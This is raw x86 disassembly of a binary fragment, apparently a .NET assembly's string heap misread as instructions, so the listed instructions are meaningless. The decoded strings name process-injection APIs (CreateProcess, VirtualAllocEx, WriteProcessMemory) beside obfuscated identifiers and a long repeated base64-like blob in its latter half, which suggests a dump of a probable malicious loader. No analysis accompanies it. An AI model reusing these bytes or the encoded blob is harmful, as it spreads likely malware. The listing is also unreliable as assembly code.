1000310f:	30 55 6b             	xor    %dl,0x6b(%ebp)
10003112:	72 75                	jb     0x10003189
10003114:	5a                   	pop    %edx
10003115:	6b 70 00 4d          	imul   $0x4d,0x0(%eax),%esi
10003119:	54                   	push   %esp
1000311a:	47                   	inc    %edi
1000311b:	72 63                	jb     0x10003180
1000311d:	6d                   	insl   (%dx),%es:(%edi)
1000311e:	6c                   	insb   (%dx),%es:(%edi)
1000311f:	46                   	inc    %esi
10003120:	72 36                	jb     0x10003158
10003122:	53                   	push   %ebx
10003123:	43                   	inc    %ebx
10003124:	73 45                	jae    0x1000316b
10003126:	56                   	push   %esi
10003127:	63 71 00             	arpl   %esi,0x0(%ecx)
1000312a:	53                   	push   %ebx
1000312b:	79 73                	jns    0x100031a0
1000312d:	74 65                	je     0x10003194
1000312f:	6d                   	insl   (%dx),%es:(%edi)
10003130:	2e 4c                	cs dec %esp
10003132:	69 6e 71 00 57 66 6e 	imul   $0x6e665700,0x71(%esi),%ebp
10003139:	54                   	push   %esp
1000313a:	50                   	push   %eax
1000313b:	6b 55 31 6d          	imul   $0x6d,0x31(%ebp),%edx
1000313f:	4f                   	dec    %edi
10003140:	58                   	pop    %eax
10003141:	42                   	inc    %edx
10003142:	6b 73 67 54          	imul   $0x54,0x67(%ebx),%esi
10003146:	7a 6c                	jp     0x100031b4
10003148:	56                   	push   %esi
10003149:	54                   	push   %esp
1000314a:	4b                   	dec    %ebx
1000314b:	72 00                	jb     0x1000314d
1000314d:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
10003152:	00 49 6e             	add    %cl,0x6e(%ecx)
10003155:	74 50                	je     0x100031a7
10003157:	74 72                	je     0x100031cb
10003159:	00 53 79             	add    %dl,0x79(%ebx)
1000315c:	73 74                	jae    0x100031d2
1000315e:	65 6d                	gs insl (%dx),%es:(%edi)
10003160:	2e 44                	cs inc %esp
10003162:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
10003169:	69 63 73 00 53 79 73 	imul   $0x73795300,0x73(%ebx),%esp
10003170:	74 65                	je     0x100031d7
10003172:	6d                   	insl   (%dx),%es:(%edi)
10003173:	2e 52                	cs push %edx
10003175:	75 6e                	jne    0x100031e5
10003177:	74 69                	je     0x100031e2
10003179:	6d                   	insl   (%dx),%es:(%edi)
1000317a:	65 2e 49             	gs cs dec %ecx
1000317d:	6e                   	outsb  %ds:(%esi),(%dx)
1000317e:	74 65                	je     0x100031e5
10003180:	72 6f                	jb     0x100031f1
10003182:	70 53                	jo     0x100031d7
10003184:	65 72 76             	gs jb  0x100031fd
10003187:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
1000318e:	73 74                	jae    0x10003204
10003190:	65 6d                	gs insl (%dx),%es:(%edi)
10003192:	2e 52                	cs push %edx
10003194:	75 6e                	jne    0x10003204
10003196:	74 69                	je     0x10003201
10003198:	6d                   	insl   (%dx),%es:(%edi)
10003199:	65 2e 43             	gs cs inc %ebx
1000319c:	6f                   	outsl  %ds:(%esi),(%dx)
1000319d:	6d                   	insl   (%dx),%es:(%edi)
1000319e:	70 69                	jo     0x10003209
100031a0:	6c                   	insb   (%dx),%es:(%edi)
100031a1:	65 72 53             	gs jb  0x100031f7
100031a4:	65 72 76             	gs jb  0x1000321d
100031a7:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
100031ae:	62 75 67             	bound  %esi,0x67(%ebp)
100031b1:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
100031b8:	65 
100031b9:	73 00                	jae    0x100031bb
100031bb:	47                   	inc    %edi
100031bc:	65 74 46             	gs je  0x10003205
100031bf:	69 6c 65 73 00 43 6f 	imul   $0x6e6f4300,0x73(%ebp,%eiz,2),%ebp
100031c6:	6e 
100031c7:	74 61                	je     0x1000322a
100031c9:	69 6e 73 00 43 72 65 	imul   $0x65724300,0x73(%esi),%ebp
100031d0:	61                   	popa
100031d1:	74 65                	je     0x10003238
100031d3:	50                   	push   %eax
100031d4:	72 6f                	jb     0x10003245
100031d6:	63 65 73             	arpl   %esp,0x73(%ebp)
100031d9:	73 00                	jae    0x100031db
100031db:	4f                   	dec    %edi
100031dc:	62 6a 65             	bound  %ebp,0x65(%edx)
100031df:	63 74 00 59          	arpl   %esi,0x59(%eax,%eax,1)
100031e3:	42                   	inc    %edx
100031e4:	54                   	push   %esp
100031e5:	70 7a                	jo     0x10003261
100031e7:	57                   	push   %edi
100031e8:	39 6d 32             	cmp    %ebp,0x32(%ebp)
100031eb:	37                   	aaa
100031ec:	71 58                	jno    0x10003246
100031ee:	78 65                	js     0x10003255
100031f0:	68 74 00 43 6f       	push   $0x6f430074
100031f5:	6e                   	outsb  %ds:(%esi),(%dx)
100031f6:	76 65                	jbe    0x1000325d
100031f8:	72 74                	jb     0x1000326e
100031fa:	00 4e 65             	add    %cl,0x65(%esi)
100031fd:	78 74                	js     0x10003273
100031ff:	00 53 79             	add    %dl,0x79(%ebx)
10003202:	73 74                	jae    0x10003278
10003204:	65 6d                	gs insl (%dx),%es:(%edi)
10003206:	2e 54                	cs push %esp
10003208:	65 78 74             	gs js  0x1000327f
1000320b:	00 4f 6b             	add    %cl,0x6b(%edi)
1000320e:	53                   	push   %ebx
1000320f:	6d                   	insl   (%dx),%es:(%edi)
10003210:	58                   	pop    %eax
10003211:	70 4b                	jo     0x1000325e
10003213:	45                   	inc    %ebp
10003214:	30 54 45 4e          	xor    %dl,0x4e(%ebp,%eax,2)
10003218:	6b 78 74 00          	imul   $0x0,0x74(%eax),%edi
1000321c:	56                   	push   %esi
1000321d:	71 66                	jno    0x10003285
1000321f:	50                   	push   %eax
10003220:	5a                   	pop    %edx
10003221:	57                   	push   %edi
10003222:	78 6a                	js     0x1000328e
10003224:	66 4b                	dec    %bx
10003226:	66 63 6c 76 43       	arpl   %bp,0x43(%esi,%esi,2)
1000322b:	31 75 00             	xor    %esi,0x0(%ebp)
1000322e:	55                   	push   %ebp
1000322f:	5a                   	pop    %edx
10003230:	46                   	inc    %esi
10003231:	4e                   	dec    %esi
10003232:	73 70                	jae    0x100032a4
10003234:	53                   	push   %ebx
10003235:	50                   	push   %eax
10003236:	74 47                	je     0x1000327f
10003238:	44                   	inc    %esp
10003239:	4d                   	dec    %ebp
1000323a:	61                   	popa
1000323b:	59                   	pop    %ecx
1000323c:	6a 57                	push   $0x57
1000323e:	73 64                	jae    0x100032a4
10003240:	41                   	inc    %ecx
10003241:	37                   	aaa
10003242:	5a                   	pop    %edx
10003243:	75 00                	jne    0x10003245
10003245:	58                   	pop    %eax
10003246:	66 67 53             	addr16 push %bx
10003249:	4d                   	dec    %ebp
1000324a:	49                   	dec    %ecx
1000324b:	64 79 46             	fs jns 0x10003294
1000324e:	42                   	inc    %edx
1000324f:	53                   	push   %ebx
10003250:	4a                   	dec    %edx
10003251:	69 77 00 56 69 72 74 	imul   $0x74726956,0x0(%edi),%esi
10003258:	75 61                	jne    0x100032bb
1000325a:	6c                   	insb   (%dx),%es:(%edi)
1000325b:	41                   	inc    %ecx
1000325c:	6c                   	insb   (%dx),%es:(%edi)
1000325d:	6c                   	insb   (%dx),%es:(%edi)
1000325e:	6f                   	outsl  %ds:(%esi),(%dx)
1000325f:	63 45 78             	arpl   %eax,0x78(%ebp)
10003262:	00 56 6a             	add    %dl,0x6a(%esi)
10003265:	6c                   	insb   (%dx),%es:(%edi)
10003266:	47                   	inc    %edi
10003267:	4c                   	dec    %esp
10003268:	77 52                	ja     0x100032bc
1000326a:	49                   	dec    %ecx
1000326b:	43                   	inc    %ebx
1000326c:	4b                   	dec    %ebx
1000326d:	55                   	push   %ebp
1000326e:	7a 59                	jp     0x100032c9
10003270:	42                   	inc    %edx
10003271:	66 6c                	data16 insb (%dx),%es:(%edi)
10003273:	52                   	push   %edx
10003274:	34 65                	xor    $0x65,%al
10003276:	78 00                	js     0x10003278
10003278:	4d                   	dec    %ebp
10003279:	41                   	inc    %ecx
1000327a:	4d                   	dec    %ebp
1000327b:	62 73 45             	bound  %esi,0x45(%ebx)
1000327e:	6c                   	insb   (%dx),%es:(%edi)
1000327f:	78 4f                	js     0x100032d0
10003281:	35 6d 73 35 52       	xor    $0x5235736d,%eax
10003286:	35 43 79 00 54       	xor    $0x54007943,%eax
1000328b:	6f                   	outsl  %ds:(%esi),(%dx)
1000328c:	41                   	inc    %ecx
1000328d:	72 72                	jb     0x10003301
1000328f:	61                   	popa
10003290:	79 00                	jns    0x10003292
10003292:	57                   	push   %edi
10003293:	72 69                	jb     0x100032fe
10003295:	74 65                	je     0x100032fc
10003297:	50                   	push   %eax
10003298:	72 6f                	jb     0x10003309
1000329a:	63 65 73             	arpl   %esp,0x73(%ebp)
1000329d:	73 4d                	jae    0x100032ec
1000329f:	65 6d                	gs insl (%dx),%es:(%edi)
100032a1:	6f                   	outsl  %ds:(%esi),(%dx)
100032a2:	72 79                	jb     0x1000331d
100032a4:	00 44 69 72          	add    %al,0x72(%ecx,%ebp,2)
100032a8:	65 63 74 6f 72       	arpl   %esi,%gs:0x72(%edi,%ebp,2)
100032ad:	79 00                	jns    0x100032af
100032af:	6f                   	outsl  %ds:(%esi),(%dx)
100032b0:	70 5f                	jo     0x10003311
100032b2:	45                   	inc    %ebp
100032b3:	71 75                	jno    0x1000332a
100032b5:	61                   	popa
100032b6:	6c                   	insb   (%dx),%es:(%edi)
100032b7:	69 74 79 00 50 77 4b 	imul   $0x744b7750,0x0(%ecx,%edi,2),%esi
100032be:	74 
100032bf:	61                   	popa
100032c0:	76 32                	jbe    0x100032f4
100032c2:	78 46                	js     0x1000330a
100032c4:	34 56                	xor    $0x56,%al
100032c6:	56                   	push   %esi
100032c7:	66 52                	push   %dx
100032c9:	7a 00                	jp     0x100032cb
100032cb:	00 00                	add    %al,(%eax)
100032cd:	84 d1                	test   %dl,%cl
100032cf:	56                   	push   %esi
100032d0:	00 33                	add    %dh,(%ebx)
100032d2:	00 56 00             	add    %dl,0x0(%esi)
100032d5:	6b 00 55             	imul   $0x55,(%eax),%eax
100032d8:	00 47 00             	add    %al,0x0(%edi)
100032db:	52                   	push   %edx
100032dc:	00 55 00             	add    %dl,0x0(%ebp)
100032df:	55                   	push   %ebp
100032e0:	00 45 00             	add    %al,0x0(%ebp)
100032e3:	6c                   	insb   (%dx),%es:(%edi)
100032e4:	00 70 00             	add    %dh,0x0(%eax)
100032e7:	4d                   	dec    %ebp
100032e8:	00 6c 00 4a          	add    %ch,0x4a(%eax,%eax,1)
100032ec:	00 74 00 52          	add    %dh,0x52(%eax,%eax,1)
100032f0:	00 6c 00 64          	add    %ch,0x64(%eax,%eax,1)
100032f4:	00 31                	add    %dh,(%ecx)
100032f6:	00 5a 00             	add    %bl,0x0(%edx)
100032f9:	46                   	inc    %esi
100032fa:	00 42 00             	add    %al,0x0(%edx)
100032fd:	6b 00 56             	imul   $0x56,(%eax),%eax
10003300:	00 46 00             	add    %al,0x0(%esi)
10003303:	42                   	inc    %edx
10003304:	00 4a 00             	add    %cl,0x0(%edx)
10003307:	61                   	popa
10003308:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
1000330c:	00 58 00             	add    %bl,0x0(%eax)
1000330f:	64 00 57 00          	add    %dl,%fs:0x0(%edi)
10003313:	52                   	push   %edx
10003314:	00 51 00             	add    %dl,0x0(%ecx)
10003317:	5a                   	pop    %edx
10003318:	00 46 00             	add    %al,0x0(%esi)
1000331b:	52                   	push   %edx
1000331c:	00 51 00             	add    %dl,0x0(%ecx)
1000331f:	53                   	push   %ebx
10003320:	00 57 00             	add    %dl,0x0(%edi)
10003323:	6b 00 79             	imul   $0x79,(%eax),%eax
10003326:	00 63 00             	add    %ah,0x0(%ebx)
10003329:	47                   	inc    %edi
1000332a:	00 4a 00             	add    %cl,0x0(%edx)
1000332d:	48                   	dec    %eax
1000332e:	00 56 00             	add    %dl,0x0(%esi)
10003331:	33 00                	xor    (%eax),%eax
10003333:	56                   	push   %esi
10003334:	00 6b 00             	add    %ch,0x0(%ebx)
10003337:	55                   	push   %ebp
10003338:	00 47 00             	add    %al,0x0(%edi)
1000333b:	52                   	push   %edx
1000333c:	00 55 00             	add    %dl,0x0(%ebp)
1000333f:	55                   	push   %ebp
10003340:	00 45 00             	add    %al,0x0(%ebp)
10003343:	6c                   	insb   (%dx),%es:(%edi)
10003344:	00 70 00             	add    %dh,0x0(%eax)
10003347:	4d                   	dec    %ebp
10003348:	00 6c 00 64          	add    %ch,0x64(%eax,%eax,1)
1000334c:	00 31                	add    %dh,(%ecx)
1000334e:	00 5a 00             	add    %bl,0x0(%edx)
10003351:	46                   	inc    %esi
10003352:	00 42 00             	add    %al,0x0(%edx)
10003355:	6b 00 56             	imul   $0x56,(%eax),%eax
10003358:	00 46 00             	add    %al,0x0(%esi)
1000335b:	42                   	inc    %edx
1000335c:	00 4a 00             	add    %cl,0x0(%edx)
1000335f:	61                   	popa
10003360:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
10003364:	00 57 00             	add    %dl,0x0(%edi)
10003367:	61                   	popa
10003368:	00 30                	add    %dh,(%eax)
1000336a:	00 6c 00 58          	add    %ch,0x58(%eax,%eax,1)
1000336e:	00 64 00 57          	add    %ah,0x57(%eax,%eax,1)
10003372:	00 52 00             	add    %dl,0x0(%edx)
10003375:	51                   	push   %ecx
10003376:	00 5a 00             	add    %bl,0x0(%edx)
10003379:	46                   	inc    %esi
1000337a:	00 52 00             	add    %dl,0x0(%edx)
1000337d:	51                   	push   %ecx
1000337e:	00 53 00             	add    %dl,0x0(%ebx)
10003381:	57                   	push   %edi
10003382:	00 6b 00             	add    %ch,0x0(%ebx)
10003385:	79 00                	jns    0x10003387
10003387:	56                   	push   %esi
10003388:	00 33                	add    %dh,(%ebx)
1000338a:	00 56 00             	add    %dl,0x0(%esi)
1000338d:	6b 00 55             	imul   $0x55,(%eax),%eax
10003390:	00 47 00             	add    %al,0x0(%edi)
10003393:	52                   	push   %edx
10003394:	00 55 00             	add    %dl,0x0(%ebp)
10003397:	55                   	push   %ebp
10003398:	00 45 00             	add    %al,0x0(%ebp)
1000339b:	6c                   	insb   (%dx),%es:(%edi)
1000339c:	00 70 00             	add    %dh,0x0(%eax)
1000339f:	4d                   	dec    %ebp
100033a0:	00 6b 00             	add    %ch,0x0(%ebx)
100033a3:	68 00 53 00 64       	push   $0x64005300
100033a8:	00 6c 00 64          	add    %ch,0x64(%eax,%eax,1)
100033ac:	00 31                	add    %dh,(%ecx)
100033ae:	00 5a 00             	add    %bl,0x0(%edx)
100033b1:	46                   	inc    %esi
100033b2:	00 42 00             	add    %al,0x0(%edx)
100033b5:	6b 00 56             	imul   $0x56,(%eax),%eax
100033b8:	00 46 00             	add    %al,0x0(%esi)
100033bb:	42                   	inc    %edx
100033bc:	00 4a 00             	add    %cl,0x0(%edx)
100033bf:	61                   	popa
100033c0:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
100033c4:	00 58 00             	add    %bl,0x0(%eax)
100033c7:	64 00 57 00          	add    %dl,%fs:0x0(%edi)
100033cb:	52                   	push   %edx
100033cc:	00 51 00             	add    %dl,0x0(%ecx)
100033cf:	5a                   	pop    %edx
100033d0:	00 46 00             	add    %al,0x0(%esi)
100033d3:	52                   	push   %edx
100033d4:	00 51 00             	add    %dl,0x0(%ecx)
100033d7:	53                   	push   %ebx
100033d8:	00 57 00             	add    %dl,0x0(%edi)
100033db:	6b 00 79             	imul   $0x79,(%eax),%eax
100033de:	00 53 00             	add    %dl,0x0(%ebx)
100033e1:	55                   	push   %ebp
100033e2:	00 64 00 47          	add    %ah,0x47(%eax,%eax,1)
100033e6:	00 56 00             	add    %dl,0x0(%esi)
100033e9:	33 00                	xor    (%eax),%eax
100033eb:	56                   	push   %esi
100033ec:	00 6b 00             	add    %ch,0x0(%ebx)
100033ef:	55                   	push   %ebp
100033f0:	00 47 00             	add    %al,0x0(%edi)
100033f3:	52                   	push   %edx
100033f4:	00 55 00             	add    %dl,0x0(%ebp)
100033f7:	55                   	push   %ebp
100033f8:	00 45 00             	add    %al,0x0(%ebp)
100033fb:	6c                   	insb   (%dx),%es:(%edi)
100033fc:	00 70 00             	add    %dh,0x0(%eax)
100033ff:	4d                   	dec    %ebp
10003400:	00 6c 00 64          	add    %ch,0x64(%eax,%eax,1)
10003404:	00 31                	add    %dh,(%ecx)
10003406:	00 5a 00             	add    %bl,0x0(%edx)
10003409:	46                   	inc    %esi
1000340a:	00 42 00             	add    %al,0x0(%edx)
1000340d:	6b 00 56             	imul   $0x56,(%eax),%eax
10003410:	00 46 00             	add    %al,0x0(%esi)
10003413:	42                   	inc    %edx
10003414:	00 4a 00             	add    %cl,0x0(%edx)
10003417:	61                   	popa
10003418:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
1000341c:	00 7a 00             	add    %bh,0x0(%edx)
1000341f:	59                   	pop    %ecx
10003420:	00 6b 00             	add    %ch,0x0(%ebx)
10003423:	64 00 58 00          	add    %bl,%fs:0x0(%eax)
10003427:	64 00 57 00          	add    %dl,%fs:0x0(%edi)
1000342b:	52                   	push   %edx
1000342c:	00 51 00             	add    %dl,0x0(%ecx)
1000342f:	5a                   	pop    %edx
10003430:	00 46 00             	add    %al,0x0(%esi)
10003433:	52                   	push   %edx
10003434:	00 51 00             	add    %dl,0x0(%ecx)
10003437:	53                   	push   %ebx
10003438:	00 57 00             	add    %dl,0x0(%edi)
1000343b:	6b 00 79             	imul   $0x79,(%eax),%eax
1000343e:	00 56 00             	add    %dl,0x0(%esi)
10003441:	33 00                	xor    (%eax),%eax
10003443:	56                   	push   %esi
10003444:	00 6b 00             	add    %ch,0x0(%ebx)
10003447:	55                   	push   %ebp
10003448:	00 47 00             	add    %al,0x0(%edi)
1000344b:	52                   	push   %edx
1000344c:	00 55 00             	add    %dl,0x0(%ebp)
1000344f:	55                   	push   %ebp
10003450:	00 45 00             	add    %al,0x0(%ebp)
10003453:	6c                   	insb   (%dx),%es:(%edi)
10003454:	00 70 00             	add    %dh,0x0(%eax)
10003457:	4d                   	dec    %ebp
10003458:	00 6a 00             	add    %ch,0x0(%edx)
1000345b:	6c                   	insb   (%dx),%es:(%edi)
1000345c:	00 71 00             	add    %dh,0x0(%ecx)
1000345f:	57                   	push   %edi
10003460:	00 56 00             	add    %dl,0x0(%esi)
10003463:	64 00 31             	add    %dh,%fs:(%ecx)
10003466:	00 5a 00             	add    %bl,0x0(%edx)
10003469:	46                   	inc    %esi
1000346a:	00 42 00             	add    %al,0x0(%edx)
1000346d:	6b 00 56             	imul   $0x56,(%eax),%eax
10003470:	00 46 00             	add    %al,0x0(%esi)
10003473:	42                   	inc    %edx
10003474:	00 4a 00             	add    %cl,0x0(%edx)
10003477:	61                   	popa
10003478:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
1000347c:	00 58 00             	add    %bl,0x0(%eax)
1000347f:	64 00 57 00          	add    %dl,%fs:0x0(%edi)
10003483:	52                   	push   %edx
10003484:	00 51 00             	add    %dl,0x0(%ecx)
10003487:	5a                   	pop    %edx
10003488:	00 46 00             	add    %al,0x0(%esi)
1000348b:	52                   	push   %edx
1000348c:	00 51 00             	add    %dl,0x0(%ecx)
1000348f:	53                   	push   %ebx
10003490:	00 57 00             	add    %dl,0x0(%edi)
10003493:	6b 00 79             	imul   $0x79,(%eax),%eax
10003496:	00 57 00             	add    %dl,0x0(%edi)
10003499:	46                   	inc    %esi
1000349a:	00 4a 00             	add    %cl,0x0(%edx)
1000349d:	73 00                	jae    0x1000349f
1000349f:	56                   	push   %esi
100034a0:	00 33                	add    %dh,(%ebx)
100034a2:	00 56 00             	add    %dl,0x0(%esi)
100034a5:	6b 00 55             	imul   $0x55,(%eax),%eax
100034a8:	00 47 00             	add    %al,0x0(%edi)
100034ab:	52                   	push   %edx
100034ac:	00 55 00             	add    %dl,0x0(%ebp)
100034af:	55                   	push   %ebp
100034b0:	00 45 00             	add    %al,0x0(%ebp)
100034b3:	6c                   	insb   (%dx),%es:(%edi)
100034b4:	00 70 00             	add    %dh,0x0(%eax)
100034b7:	4d                   	dec    %ebp
100034b8:	00 6c 00 64          	add    %ch,0x64(%eax,%eax,1)
100034bc:	00 31                	add    %dh,(%ecx)
100034be:	00 5a 00             	add    %bl,0x0(%edx)
100034c1:	46                   	inc    %esi
100034c2:	00 42 00             	add    %al,0x0(%edx)
100034c5:	6b 00 56             	imul   $0x56,(%eax),%eax
100034c8:	00 46 00             	add    %al,0x0(%esi)
100034cb:	42                   	inc    %edx
100034cc:	00 4a 00             	add    %cl,0x0(%edx)
100034cf:	61                   	popa
100034d0:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
100034d4:	00 4a 00             	add    %cl,0x0(%edx)
100034d7:	52                   	push   %edx
100034d8:	00 7a 00             	add    %bh,0x0(%edx)
100034db:	46                   	inc    %esi
100034dc:	00 58 00             	add    %bl,0x0(%eax)
100034df:	64 00 57 00          	add    %dl,%fs:0x0(%edi)
100034e3:	52                   	push   %edx
100034e4:	00 51 00             	add    %dl,0x0(%ecx)
100034e7:	5a                   	pop    %edx
100034e8:	00 46 00             	add    %al,0x0(%esi)
100034eb:	52                   	push   %edx
100034ec:	00 51 00             	add    %dl,0x0(%ecx)
100034ef:	53                   	push   %ebx
100034f0:	00 57 00             	add    %dl,0x0(%edi)
100034f3:	6b 00 79             	imul   $0x79,(%eax),%eax
100034f6:	00 56 00             	add    %dl,0x0(%esi)
100034f9:	33 00                	xor    (%eax),%eax
100034fb:	56                   	push   %esi
100034fc:	00 6b 00             	add    %ch,0x0(%ebx)
100034ff:	55                   	push   %ebp
10003500:	00 47 00             	add    %al,0x0(%edi)
10003503:	52                   	push   %edx
10003504:	00 55 00             	add    %dl,0x0(%ebp)
10003507:	55                   	push   %ebp
10003508:	00 45 00             	add    %al,0x0(%ebp)
1000350b:	6c                   	insb   (%dx),%es:(%edi)
1000350c:	00 70 00             	add    %dh,0x0(%eax)
1000350f:	4d                   	dec    %ebp
10003510:	00 6d 00             	add    %ch,0x0(%ebp)
10003513:	78 00                	js     0x10003515
10003515:	69 00 56 00 31 00    	imul   $0x310056,(%eax),%eax
1000351b:	64 00 31             	add    %dh,%fs:(%ecx)
1000351e:	00 5a 00             	add    %bl,0x0(%edx)
10003521:	46                   	inc    %esi
10003522:	00 42 00             	add    %al,0x0(%edx)
10003525:	6b 00 56             	imul   $0x56,(%eax),%eax
10003528:	00 46 00             	add    %al,0x0(%esi)
1000352b:	42                   	inc    %edx
1000352c:	00 4a 00             	add    %cl,0x0(%edx)
1000352f:	61                   	popa
10003530:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
10003534:	00 58 00             	add    %bl,0x0(%eax)
10003537:	64 00 57 00          	add    %dl,%fs:0x0(%edi)
1000353b:	52                   	push   %edx
1000353c:	00 51 00             	add    %dl,0x0(%ecx)
1000353f:	5a                   	pop    %edx
10003540:	00 46 00             	add    %al,0x0(%esi)
10003543:	52                   	push   %edx
10003544:	00 51 00             	add    %dl,0x0(%ecx)
10003547:	53                   	push   %ebx
10003548:	00 57 00             	add    %dl,0x0(%edi)
1000354b:	6b 00 79             	imul   $0x79,(%eax),%eax
1000354e:	00 4f 00             	add    %cl,0x0(%edi)
10003551:	58                   	pop    %eax
10003552:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
10003556:	00 56 00             	add    %dl,0x0(%esi)
10003559:	33 00                	xor    (%eax),%eax
1000355b:	56                   	push   %esi
1000355c:	00 6b 00             	add    %ch,0x0(%ebx)
1000355f:	55                   	push   %ebp
10003560:	00 47 00             	add    %al,0x0(%edi)
10003563:	52                   	push   %edx
10003564:	00 55 00             	add    %dl,0x0(%ebp)
10003567:	55                   	push   %ebp
10003568:	00 45 00             	add    %al,0x0(%ebp)
1000356b:	6c                   	insb   (%dx),%es:(%edi)
1000356c:	00 70 00             	add    %dh,0x0(%eax)
1000356f:	4d                   	dec    %ebp
10003570:	00 6c 00 64          	add    %ch,0x64(%eax,%eax,1)
10003574:	00 31                	add    %dh,(%ecx)
10003576:	00 5a 00             	add    %bl,0x0(%edx)
10003579:	46                   	inc    %esi
1000357a:	00 42 00             	add    %al,0x0(%edx)
1000357d:	6b 00 56             	imul   $0x56,(%eax),%eax
10003580:	00 46 00             	add    %al,0x0(%esi)
10003583:	42                   	inc    %edx
10003584:	00 4a 00             	add    %cl,0x0(%edx)
10003587:	61                   	popa
10003588:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
1000358c:	00 54 00 51          	add    %dl,0x51(%eax,%eax,1)
10003590:	00 6e 00             	add    %ch,0x0(%esi)
10003593:	42                   	inc    %edx
10003594:	00 58 00             	add    %bl,0x0(%eax)
10003597:	64 00 57 00          	add    %dl,%fs:0x0(%edi)
1000359b:	52                   	push   %edx
1000359c:	00 51 00             	add    %dl,0x0(%ecx)
1000359f:	5a                   	pop    %edx
100035a0:	00 46 00             	add    %al,0x0(%esi)
100035a3:	52                   	push   %edx
100035a4:	00 51 00             	add    %dl,0x0(%ecx)
100035a7:	53                   	push   %ebx
100035a8:	00 57 00             	add    %dl,0x0(%edi)
100035ab:	6b 00 79             	imul   $0x79,(%eax),%eax
100035ae:	00 56 00             	add    %dl,0x0(%esi)
100035b1:	33 00                	xor    (%eax),%eax
100035b3:	56                   	push   %esi
100035b4:	00 6b 00             	add    %ch,0x0(%ebx)
100035b7:	55                   	push   %ebp
100035b8:	00 47 00             	add    %al,0x0(%edi)
100035bb:	52                   	push   %edx
100035bc:	00 55 00             	add    %dl,0x0(%ebp)
100035bf:	55                   	push   %ebp
100035c0:	00 45 00             	add    %al,0x0(%ebp)
100035c3:	6c                   	insb   (%dx),%es:(%edi)
100035c4:	00 70 00             	add    %dh,0x0(%eax)
100035c7:	4d                   	dec    %ebp
100035c8:	00 6d 00             	add    %ch,0x0(%ebp)
100035cb:	4a                   	dec    %edx
100035cc:	00 70 00             	add    %dh,0x0(%eax)
100035cf:	51                   	push   %ecx
100035d0:	00 6c 00 64          	add    %ch,0x64(%eax,%eax,1)
100035d4:	00 31                	add    %dh,(%ecx)
100035d6:	00 5a 00             	add    %bl,0x0(%edx)
100035d9:	46                   	inc    %esi
100035da:	00 42 00             	add    %al,0x0(%edx)
100035dd:	6b 00 56             	imul   $0x56,(%eax),%eax
100035e0:	00 46 00             	add    %al,0x0(%esi)
100035e3:	42                   	inc    %edx
100035e4:	00 4a 00             	add    %cl,0x0(%edx)
100035e7:	61                   	popa
100035e8:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
100035ec:	00 58 00             	add    %bl,0x0(%eax)
100035ef:	64 00 57 00          	add    %dl,%fs:0x0(%edi)
100035f3:	52                   	push   %edx
100035f4:	00 51 00             	add    %dl,0x0(%ecx)
100035f7:	5a                   	pop    %edx
100035f8:	00 46 00             	add    %al,0x0(%esi)
100035fb:	52                   	push   %edx
100035fc:	00 51 00             	add    %dl,0x0(%ecx)
100035ff:	53                   	push   %ebx
10003600:	00 57 00             	add    %dl,0x0(%edi)
10003603:	6b 00 79             	imul   $0x79,(%eax),%eax
10003606:	00 4d 00             	add    %cl,0x0(%ebp)
10003609:	46                   	inc    %esi
1000360a:	00 6c 00 59          	add    %ch,0x59(%eax,%eax,1)
1000360e:	00 56 00             	add    %dl,0x0(%esi)
10003611:	33 00                	xor    (%eax),%eax
10003613:	56                   	push   %esi
10003614:	00 6b 00             	add    %ch,0x0(%ebx)
10003617:	55                   	push   %ebp
10003618:	00 47 00             	add    %al,0x0(%edi)
1000361b:	52                   	push   %edx
1000361c:	00 55 00             	add    %dl,0x0(%ebp)
1000361f:	55                   	push   %ebp
10003620:	00 45 00             	add    %al,0x0(%ebp)
10003623:	6c                   	insb   (%dx),%es:(%edi)
10003624:	00 70 00             	add    %dh,0x0(%eax)
10003627:	4d                   	dec    %ebp
10003628:	00 6c 00 64          	add    %ch,0x64(%eax,%eax,1)
1000362c:	00 31                	add    %dh,(%ecx)
1000362e:	00 5a 00             	add    %bl,0x0(%edx)
10003631:	46                   	inc    %esi
10003632:	00 42 00             	add    %al,0x0(%edx)
10003635:	6b 00 56             	imul   $0x56,(%eax),%eax
10003638:	00 46 00             	add    %al,0x0(%esi)
1000363b:	42                   	inc    %edx
1000363c:	00 4a 00             	add    %cl,0x0(%edx)
1000363f:	61                   	popa
10003640:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
10003644:	00 4b 00             	add    %cl,0x0(%ebx)
10003647:	62 00                	bound  %eax,(%eax)
10003649:	6c                   	insb   (%dx),%es:(%edi)
1000364a:	00 70 00             	add    %dh,0x0(%eax)
1000364d:	58                   	pop    %eax
1000364e:	00 64 00 57          	add    %ah,0x57(%eax,%eax,1)
10003652:	00 52 00             	add    %dl,0x0(%edx)
10003655:	51                   	push   %ecx
10003656:	00 5a 00             	add    %bl,0x0(%edx)
10003659:	46                   	inc    %esi
1000365a:	00 52 00             	add    %dl,0x0(%edx)
1000365d:	51                   	push   %ecx
1000365e:	00 53 00             	add    %dl,0x0(%ebx)
10003661:	57                   	push   %edi
10003662:	00 6b 00             	add    %ch,0x0(%ebx)
10003665:	79 00                	jns    0x10003667
10003667:	56                   	push   %esi
10003668:	00 33                	add    %dh,(%ebx)
1000366a:	00 56 00             	add    %dl,0x0(%esi)
1000366d:	6b 00 55             	imul   $0x55,(%eax),%eax
10003670:	00 47 00             	add    %al,0x0(%edi)
10003673:	52                   	push   %edx
10003674:	00 55 00             	add    %dl,0x0(%ebp)
10003677:	55                   	push   %ebp
10003678:	00 45 00             	add    %al,0x0(%ebp)
1000367b:	6c                   	insb   (%dx),%es:(%edi)
